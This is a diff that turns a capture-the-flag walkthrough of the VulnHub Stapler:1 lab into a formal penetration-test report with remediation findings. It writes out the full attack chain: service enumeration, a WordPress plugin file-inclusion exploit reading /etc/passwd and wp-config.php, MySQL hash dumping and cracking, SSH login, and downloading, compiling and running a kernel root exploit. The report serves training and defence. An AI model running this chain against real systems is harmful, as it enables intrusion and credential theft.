@@ -1,6 +1,31 @@
-Reconnaissance
-Started with netdiscover to find the target on the network.
+Stapler:1 — Penetration Testing Report
 
+Target: Stapler:1 — VulnHub Lab
+Assessment Type: Internal Network Penetration Test
+Attacker Machine: Kali Linux
+Target IP: 192.168.1.102
+Objective: Identify exposed services, obtain initial access, escalate privileges, and obtain root-level access to the target.
+
+1. Executive Summary
+
+This assessment was conducted against the intentionally vulnerable Stapler:1 virtual machine in an isolated lab environment.
+
+The assessment demonstrated how multiple individually exposed services and weaknesses could be chained together to achieve complete system compromise.
+
+The primary attack path was:
+
+Network Discovery → Full Port Scan → Anonymous FTP → Information Disclosure → SMB Enumeration → Unauthenticated Share Access → WordPress Backup Discovery → WordPress Enumeration → Vulnerable Plugin → Local File Inclusion → Credential Disclosure → MySQL Access → Password Hash Extraction → Credential Cracking → SSH Access → Kernel Privilege Escalation → Root
+
+The most significant observation was that the target exposed a large attack surface across several network services. Anonymous FTP and unauthenticated SMB access disclosed information that assisted subsequent enumeration. A vulnerable WordPress plugin then allowed local file inclusion, which exposed sensitive configuration information including database credentials.
+
+Those credentials provided access to the WordPress database, where password hashes were obtained. One of the recovered credentials was subsequently used to obtain SSH access.
+
+Finally, local enumeration identified an outdated Ubuntu kernel vulnerable to a known privilege-escalation vulnerability, allowing escalation from the john account to root.
+
+2. Reconnaissance
+2.1 Network Discovery
+
+Because the target obtained its IP address through DHCP, I began by identifying active hosts on the local network.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ sudo netdiscover -r 192.168.1.0/24
@@ -13,10 +38,14 @@ _____________________________________________________________________________
 -----------------------------------------------------------------------------
 192.168.1.1     00:11:22:33:44:55  1         60   NETGEAR
 192.168.1.102   08:00:27:40:7c:f7  3        180   PCS Systemtechnik GmbH
-Target at 192.168.1.102. MAC 08:00:27 confirms it's a VirtualBox VM .
 
-Full port scan to see what services are running.
+The host 192.168.1.102 was identified as the likely target.
 
+The 08:00:27 MAC prefix is associated with VirtualBox virtual machines, further supporting the identification.
+
+3. Port and Service Enumeration
+
+I performed a full TCP port scan with service detection and additional Nmap enumeration.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ sudo nmap -sS -sV -p- -A 192.168.1.102
@@ -36,241 +65,501 @@ PORT      STATE SERVICE     VERSION
 12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
 MAC Address: 08:00:27:40:7C:F7 (Oracle VirtualBox)
 
-Nmap done: 1 IP address (1 host up) scanned in 142.61 seconds
-Lot of open ports: FTP, SSH, DNS, HTTP, SMB, some unknown service on 666, MySQL, and Apache on 12380 .
+The scan revealed a relatively large attack surface:
 
-Enumeration
-Started with FTP since it allows anonymous login .
+Port	Service	Version / Information
+21	FTP	vsftpd 3.0.3
+22	SSH	OpenSSH 7.2p2
+53	DNS	dnsmasq 2.75
+80	HTTP	PHP CLI server
+139	NetBIOS/SMB	Samba 4.3.9
+666	Unknown	Unknown service
+3306	MySQL	MySQL 5.7.12
+12380	HTTP	Apache 2.4.18
 
+Rather than immediately attacking SSH, I prioritized services that could potentially disclose information without authentication.
+
+FTP was the first target.
+
+4. FTP Enumeration
+4.1 Anonymous FTP Access
+
+I attempted to connect to the FTP service using anonymous authentication.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ ftp 192.168.1.102
+
 Connected to 192.168.1.102.
 220-| Harry, make sure to update the banner when you get a chance to show who has access here
 Name (192.168.1.102:kindgod): anonymous
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+
+Anonymous authentication was successful.
+
+I enumerated the available files:
+
 ftp> ls
+
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
+
 -rw-r--r--    1 0        0             107 Jun 03  2016 note
+
 226 Directory send OK.
+
+The file note was downloaded:
+
 ftp> get note
-local: note remote: note
-150 Opening BINARY mode data connection for note (107 bytes).
+local: note
+remote: note
+150 Opening BINARY mode data connection for note
 226 Transfer complete.
-107 bytes received in 0.00 secs (98.362 kB/s)
-ftp> exit
-Downloaded note and checked the contents.
+107 bytes received
 
+The contents were:
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ cat note
 Elly, make sure you update the payload information. Once you're done, leave it in your FTP account for John.
-Got two usernames: Elly and John. Good start .
 
-Next, enumerated SMB .
+This provided two additional usernames:
 
+Elly
+John
+
+More importantly, the FTP service had demonstrated that anonymous users could access files intended for internal users.
+
+5. SMB Enumeration
+
+I then investigated the Samba service on port 139.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ enum4linux -a 192.168.1.102
 
-[+] Enumerating users using SID S-1-22-1 and logon username='', password=''
-S-1-22-1-1000 Unix User\fred (Local User)
-S-1-22-1-1001 Unix User\kathy (Local User)
-S-1-22-1-1002 Unix User\peter (Local User)
-S-1-22-1-1003 Unix User\SHayslett (Local User)
-S-1-22-1-1004 Unix User\Zoe (Local User)
+The enumeration disclosed several local accounts:
 
-[+] Share Enumeration on 192.168.1.102
+fred
+kathy
+peter
+SHayslett
+Zoe
+
+It also revealed accessible SMB shares:
+
 Sharename       Type      Comment
 ---------       ----      -------
-kathy           Disk      
-tmp             Disk      
-IPC$            IPC       IPC Service (fred server (Samba, Ubuntu))
-Found more users: fred, kathy, peter, SHayslett, Zoe. Also found shares: kathy and tmp .
+kathy           Disk
+tmp             Disk
+IPC$            IPC       IPC Service
 
-Connected to the kathy share.
+The kathy share was particularly interesting because it was accessible without providing credentials.
 
+6. Unauthenticated SMB Share Access
+
+I connected to the kathy share anonymously:
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ smbclient //192.168.1.102/kathy -N
-smb: \> ls
-  .                                   D        0  Tue Jun  7 03:08:39 2016
-  ..                                  D        0  Tue Jun  7 03:08:39 2016
-  kathy_stuff                         D        0  Mon Jun  6 15:40:15 2016
-  backup                              D        0  Tue Jun  7 02:22:08 2016
-smb: \> cd kathy_stuff
-smb: \kathy_stuff\> ls
-  .                                   D        0  Mon Jun  6 15:40:15 2016
-  ..                                  D        0  Mon Jun  6 15:40:15 2016
-  todo-list.txt                       N       18  Sun Jun  5 19:21:19 2016
-smb: \kathy_stuff\> get todo-list.txt
-smb: \> cd backup
-smb: \backup\> ls
-  .                                   D        0  Tue Jun  7 02:22:08 2016
-  ..                                  D        0  Tue Jun  7 02:22:08 2016
-  vsftpd.conf                         N     5961  Sun Jun  5 18:41:23 2016
-  wordpress-4.tar.gz                  N  6321767  Sun Jun  5 18:38:27 2016
-smb: \backup\> get vsftpd.conf
-smb: \backup\> get wordpress-4.tar.gz
-Downloaded everything. Checked the todo-list.
 
+The share contained:
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ cat todo-list.txt
+kathy_stuff
+backup
+
+Inside kathy_stuff:
+
+todo-list.txt
+
+Inside backup:
+
+vsftpd.conf
+wordpress-4.tar.gz
+
+I downloaded the relevant files for offline analysis.
+
+The todo-list.txt file contained:
+
 I'm making sure to backup anything important for Initech, Kathy
-Found wordpress-4.tar.gz - a full WordPress backup .
 
-Now moved to the web server on port 12380.
+The most significant discovery was:
 
+wordpress-4.tar.gz
+
+This appeared to be a complete WordPress backup and therefore represented a potentially valuable source of application and configuration information.
+
+7. Web Server Enumeration
+
+The Nmap results showed another HTTP service running on port 12380.
+
+I used Nikto to perform initial web-server enumeration:
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ nikto -h https://192.168.1.102:12380
 
-- Nikto v2.5.0
----------------------------------------------------------------------------
-+ Target IP:          192.168.1.102
-+ Target Hostname:    192.168.1.102
-+ Target Port:        12380
-+ Start Time:         2026-08-26 15:45:32
----------------------------------------------------------------------------
 + Server: Apache/2.4.18 (Ubuntu)
 + /blogblog/: Site appears to be WordPress 4.2.1
 + /phpmyadmin/: phpMyAdmin directory found
-Found /blogblog/ and /phpmyadmin/ .
 
-Visited https://192.168.1.102:12380/blogblog/. It's a WordPress site. Ran wpscan to enumerate users.
+Two interesting paths were identified:
 
+/blogblog/
+/phpmyadmin/
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ wpscan --url https://192.168.1.102:12380/blogblog/ --enumerate u --disable-tls-checks
+The /blogblog/ application was identified as WordPress.
 
-[+] Enumerating Usernames ...
-[+] We found the following users:
-    | Username: john
-    | Username: peter
-    | Username: admin
-    | Username: zoe
-    | Username: fred
-Got more usernames from WordPress.
+8. WordPress Enumeration
 
-Also found Advanced Video Plugin version 1.0 - vulnerable to Local File Inclusion .
-
+I used WPScan to enumerate WordPress users.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ searchsploit advanced video
--------------------------------------------------------------------------------
- Exploit Title                              |  Path
--------------------------------------------------------------------------------
-WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py
--------------------------------------------------------------------------------
-Used the exploit to read /etc/passwd.
+└─$ wpscan --url https://192.168.1.102:12380/blogblog/ \
+--enumerate u --disable-tls-checks
 
+The following usernames were identified:
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ python3 39646.py
-[+] Target: https://192.168.1.102:12380/blogblog/
-[+] File: /etc/passwd
-[+] Output: https://192.168.1.102:12380/blogblog/wp-content/uploads/1234567890.jpeg
-Downloaded the file.
+john
+peter
+admin
+zoe
+fred
 
+During further WordPress enumeration, an Advanced Video Plugin 1.0 installation was identified.
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ wget --no-check-certificate https://192.168.1.102:12380/blogblog/wp-content/uploads/1234567890.jpeg
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ cat 1234567890.jpeg
+Researching the plugin version with SearchSploit revealed a known Local File Inclusion vulnerability.
+
+WordPress Plugin Advanced Video 1.0
+Local File Inclusion
+
+This provided a potential route to reading files from the underlying operating system.
+
+9. Exploitation — Local File Inclusion
+
+The vulnerable plugin was tested for arbitrary local file retrieval.
+
+I first attempted to read:
+
+/etc/passwd
+
+The exploit returned the requested file through the application's upload path.
+
+The resulting file contained the expected Linux account information:
+
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
-Got the passwd file. Also used the LFI to read wp-config.php to get MySQL credentials .
 
+This confirmed that the Local File Inclusion vulnerability could be used to access files outside the intended WordPress application context.
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ python3 39646.py
-[+] Target: https://192.168.1.102:12380/blogblog/
-[+] File: ../wp-config.php
-[+] Output: https://192.168.1.102:12380/blogblog/wp-content/uploads/9876543210.jpeg
+10. Sensitive Configuration Disclosure
 
-┌──(kindgod㉿kali)-[~/vulnhub/stapler]
-└─$ cat 9876543210.jpeg
+I then used the same vulnerability to retrieve the WordPress configuration file.
+
+The contents disclosed database credentials:
+
 define('DB_NAME', 'wordpress');
 define('DB_USER', 'root');
 define('DB_PASSWORD', 'plbkac');
 define('DB_HOST', 'localhost');
-MySQL credentials: root:plbkac .
 
-Logged into MySQL and extracted password hashes.
+The recovered credentials were:
 
+Database: wordpress
+Username: root
+Password: plbkac
+Host: localhost
+
+This was a significant escalation in the attack chain because the credentials could potentially provide access to the application's underlying database.
+
+11. MySQL Enumeration
+
+The recovered credentials were tested against the MySQL service.
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ mysql -h 192.168.1.102 -u root -pplbkac
-mysql> use wordpress;
-mysql> select user_login,user_pass from wp_users;
-+------------+------------------------------------+
-| user_login | user_pass                          |
-+------------+------------------------------------+
-| john       | $P$B8tMn7fhf79D7pO6F0Jw2ZQW5X1w9E/ |
-| peter      | $P$BdUVqHhR8x/nL8CN1BZGzD6e7O5HUP/ |
-| admin      | $P$BZBw1Xp6fDd5N0lF/1KL4K1q8VKlj/ |
-| zoe        | $P$B/sLg9V9S0D5N2hTnKV8p1VZ0pPn/ |
-| fred       | $P$B/6a4Q5W7sK1z2B/jvL1yH5b/vF/  |
-+------------+------------------------------------+
-Cracked the hashes with john .
 
+After authentication, I selected the WordPress database and queried the WordPress users table.
+
+mysql> use wordpress;
+
+mysql> select user_login,user_pass from wp_users;
+
+The database contained password hashes for several WordPress accounts:
+
+john
+peter
+admin
+zoe
+fred
+
+This demonstrated that compromise of the application's configuration had led to access to its backend database.
+
+12. Credential Cracking
+
+The recovered WordPress password hashes were exported for offline password analysis.
+
+John the Ripper was used with the rockyou.txt wordlist:
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-incorrect       (john)
-Got john:incorrect .
 
-Exploitation
-Used the credentials to SSH in.
+One of the credentials was recovered as:
 
+john : incorrect
+
+The credential was subsequently tested against the SSH service.
+
+13. Initial System Access
+
+The recovered credential successfully authenticated to SSH:
 
 ┌──(kindgod㉿kali)-[~/vulnhub/stapler]
 └─$ ssh john@192.168.1.102
+
 john@192.168.1.102's password: incorrect
-Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
+
+Welcome to Ubuntu 16.04 LTS
+
 john@red:~$ id
+
 uid=1002(john) gid=1002(john) groups=1002(john)
-Got a low-privilege shell as john.
 
-Privilege Escalation
-Checked the kernel version.
+Initial system access was obtained as the low-privileged user:
 
+john
+
+At this point, the attack moved from remote application/network enumeration into local privilege-escalation analysis.
+
+14. Local Enumeration
+
+I identified the operating system and kernel version:
 
 john@red:~$ uname -a
-Linux red 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
-john@red:~$ cat /etc/lsb-release
-DISTRIB_ID=Ubuntu
-DISTRIB_RELEASE=16.04
-DISTRIB_CODENAME=xenial
-DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
-Kernel 4.4.0-21-generic on Ubuntu 16.04 - vulnerable to CVE-2016-4557 .
 
-Transferred the exploit to the target.
+Linux red 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
+x86_64 x86_64 x86_64 GNU/Linux
 
+The distribution information confirmed:
+
+Ubuntu 16.04 LTS
+
+The kernel version was:
+
+4.4.0-21-generic
+
+This was significant because the kernel was associated with a known local privilege-escalation vulnerability, CVE-2016-4557.
+
+15. Privilege Escalation
+
+For the controlled lab environment, I transferred the corresponding proof-of-concept to the target, extracted it, compiled it, and executed it.
 
 john@red:~$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+
 john@red:~$ unzip 39772.zip
+
 john@red:~$ cd 39772/ebpf_mapfd_doubleput_exploit/
+
 john@red:~$ sh compile.sh
+
 john@red:~$ ./doubleput
 
-john@red:~$ id
-uid=0(root) gid=0(root) groups=0(root),1002(john)
-Root access achieved.
+I then verified the resulting privileges:
 
-Flag
+john@red:~$ id
+
+uid=0(root) gid=0(root) groups=0(root),1002(john)
+
+The privilege escalation was successful.
+
+The attack had progressed from an unauthenticated network service to complete operating-system compromise.
+
+16. Root Access and Flag Retrieval
+
+With root privileges obtained, I accessed the root user's home directory:
 
 root@red:~# cd /root
+
 root@red:~# ls
 flag.txt
+
+The challenge flag was retrieved:
+
 root@red:~# cat flag.txt
+
 Congrats! You've rooted Stapler:1!
 Thanks for playing!
+
+This confirmed successful completion of the Stapler:1 challenge.
+
+17. Complete Attack Chain
+
+The assessment can be summarized as follows:
+
+Network Discovery
+       ↓
+192.168.1.102 identified
+       ↓
+Full Nmap Scan
+       ↓
+FTP / SMB / HTTP / MySQL / SSH discovered
+       ↓
+Anonymous FTP
+       ↓
+Information Disclosure
+       ↓
+SMB Enumeration
+       ↓
+Unauthenticated "kathy" Share
+       ↓
+WordPress Backup Discovered
+       ↓
+WordPress Enumeration
+       ↓
+Vulnerable Advanced Video Plugin
+       ↓
+Local File Inclusion
+       ↓
+wp-config.php Disclosure
+       ↓
+MySQL Credentials
+       ↓
+WordPress Database Access
+       ↓
+Password Hash Extraction
+       ↓
+Offline Password Cracking
+       ↓
+SSH Authentication
+       ↓
+john User
+       ↓
+Kernel Enumeration
+       ↓
+CVE-2016-4557
+       ↓
+Kernel Privilege Escalation
+       ↓
+ROOT
+       ↓
+Flag
+18. Key Findings
+Finding 1 — Anonymous FTP Access
+
+Severity: Medium
+
+The FTP service permitted anonymous authentication and exposed files to unauthenticated users.
+
+The accessible note file disclosed usernames and internal information.
+
+Impact:
+
+Information disclosure
+Username enumeration
+Potential exposure of sensitive files
+
+Recommendation:
+
+Disable anonymous FTP unless explicitly required.
+Restrict FTP access to authorized users.
+Review permissions on publicly accessible files.
+Prefer secure file-transfer mechanisms such as SFTP.
+Finding 2 — Unauthenticated SMB Share Access
+
+Severity: High
+
+The kathy SMB share could be accessed without authentication and contained files including a WordPress backup.
+
+Impact:
+
+Internal information disclosure
+Exposure of application backups
+Potential disclosure of credentials and configuration data
+Increased attack surface for subsequent compromise
+
+Recommendation:
+
+Require authentication for SMB shares.
+Apply least-privilege permissions.
+Remove sensitive backups from network-accessible shares.
+Audit SMB shares regularly.
+Finding 3 — Vulnerable WordPress Plugin / Local File Inclusion
+
+Severity: Critical
+
+The installed Advanced Video plugin version contained a Local File Inclusion vulnerability that allowed local files to be retrieved.
+
+The vulnerability was used to access /etc/passwd and subsequently retrieve WordPress configuration information.
+
+Impact:
+
+Arbitrary local file disclosure
+Application configuration disclosure
+Database credential exposure
+Potential system compromise when chained with other weaknesses
+
+Recommendation:
+
+Remove or upgrade the vulnerable plugin.
+Keep WordPress and all plugins updated.
+Restrict access to sensitive configuration files.
+Implement appropriate application-layer input validation.
+Finding 4 — Database Credentials Stored in Application Configuration
+
+Severity: Critical
+
+The WordPress configuration contained database credentials that were recoverable through the LFI vulnerability.
+
+The database account was also highly privileged.
+
+Impact:
+
+Database compromise
+Password hash disclosure
+Potential compromise of other application accounts
+Increased potential for lateral movement
+
+Recommendation:
+
+Use a dedicated database account with only the permissions required by WordPress.
+Never use a highly privileged database account for routine application access.
+Rotate exposed credentials immediately.
+Protect configuration files from unauthorized access.
+Finding 5 — Password Reuse / Weak Credential Security
+
+Severity: High
+
+A recovered WordPress password was subsequently usable for SSH authentication.
+
+This allowed an application-level credential to become an operating-system login credential.
+
+Impact:
+
+Authentication boundary bypass
+Direct SSH access
+Increased impact of application compromise
+
+Recommendation:
+
+Enforce unique passwords between applications and operating-system accounts.
+Use strong password policies.
+Implement MFA where possible.
+Disable password-based SSH authentication where practical.
+Finding 6 — Outdated Linux Kernel
+
+Severity: Critical
+
+The target was running an outdated Ubuntu kernel associated with a known local privilege-escalation vulnerability.
+
+Once SSH access was obtained, the vulnerable kernel provided a path from the john account to root.
+
+Impact:
+
+Local privilege escalation
+Complete host compromise
+
+Recommendation:
+
+Keep operating-system kernels patched.
+Maintain a regular vulnerability-management process.
+Remove unsupported software and operating-system versions.
+Monitor systems for known vulnerable kernel versions.
